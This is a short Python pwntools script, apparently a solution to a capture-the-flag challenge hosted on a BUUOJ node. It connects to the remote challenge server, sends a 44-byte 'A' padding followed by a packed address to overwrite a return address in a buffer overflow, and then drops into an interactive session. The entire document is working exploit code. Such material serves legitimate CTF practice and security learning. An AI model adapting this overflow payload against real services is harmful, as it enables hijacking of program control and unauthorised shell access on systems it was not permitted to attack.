from  pwn import *
sh = remote('node5.buuoj.cn', 29400)
buff_addr = 0x41348000
sh.sendline(b'A'*44+p64(buff_addr))
sh.interactive()